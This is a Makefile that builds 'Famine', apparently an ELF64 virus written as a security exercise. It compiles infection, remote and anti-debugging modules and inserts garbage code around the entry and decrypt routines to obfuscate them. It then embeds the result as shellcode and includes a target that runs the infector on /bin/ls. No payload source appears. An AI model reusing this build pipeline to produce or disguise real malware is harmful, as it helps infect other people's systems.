NAME = Famine

COMPILER = gcc
FLAGS = -MD -fno-stack-protector -fPIC -fPIE 

SRC_DIR				= .
TMP_DIR				= .tmp
OBJ_DIR				= $(TMP_DIR)/obj
OBJ_LIB_DIR			= $(OBJ_DIR)/lib
TMP_LIB_DIR			= $(TMP_DIR)/lib

SRC_C = virus.c lib/lib.c lib/infect.c lib/elf64.c lib/remote.c lib/antidebug.c
SRC_S = virus_start.s virus_bonus.s
OBJ	=	$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.o)) \
		$(addprefix $(OBJ_DIR)/, $(SRC_S:.s=.o)) \

SRC_INF_C = famine.c lib/lib.c lib/infect.c lib/elf64.c
OBJ_INF	=	$(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.o))

DEP =		$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.d)) \
		$(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.d))

VIRUS = $(TMP_DIR)/virus.template
VIRUS_X = $(TMP_DIR)/virus_shellcode.c

LD_RULES = virus_linking.lds

all: $(NAME)

$(NAME): $(OBJ_INF) $(VIRUS_X)
	$(COMPILER) -o $(NAME) $(OBJ_INF) $(VIRUS_X)

$(VIRUS_X): $(VIRUS)
	cp $< virus_shellcode
	xxd -i virus_shellcode $(VIRUS_X)
	rm virus_shellcode

$(VIRUS): $(OBJ)
	ld -o $@ -T $(LD_RULES) $(OBJ)

$(TMP_DIR):
	mkdir -p $@

$(OBJ_DIR):
	mkdir -p $@

$(OBJ_LIB_DIR):
	mkdir -p $@

$(TMP_LIB_DIR):
	mkdir -p $@

$(TMP_DIR)/%.s: $(SRC_DIR)/%.c | $(OBJ_DIR) $(TMP_LIB_DIR)
	gcc $(FLAGS) -S $< -o $@

##
## GARBAGE CODE
##

$(TMP_DIR)/virus.s.g.s: $(TMP_DIR)/virus.s
	./scripts/add_garbage $< --labels entry decrypt

$(TMP_DIR)/lib/lib.s.g.s: $(TMP_DIR)/lib/lib.s
	./scripts/add_garbage $< --labels open

##
## END
##

$(OBJ_DIR)/%.o: $(TMP_DIR)/%.s.g.s | $(OBJ_DIR) $(OBJ_LIB_DIR)
	gcc $(FLAGS) -c $< -o $@

$(OBJ_DIR)/%.o: $(SRC_DIR)/%.c | $(OBJ_DIR) $(OBJ_LIB_DIR)
	$(COMPILER) $(FLAGS) -c $< -o $@

$(OBJ_DIR)/%.o: $(SRC_DIR)/%.s | $(OBJ_DIR) $(OBJ_LIB_DIR)
	nasm -f elf64 $< -o $@

clean:
	rm -rf $(DEP)
	rm -rf $(OBJ)
	rm -rf $(OBJ_DIR)
	rm -rf $(TMP_DIR)

fclean: clean
	rm -rf $(NAME)
	rm -rf woody

re: fclean
	echo $(DEP)
	$(MAKE)

-include $(DEP)

.PHONY: all re clean fclean test unit_test

test: all
	(cd test && ./test.sh)

ls: all
	./$(NAME) /bin/ls
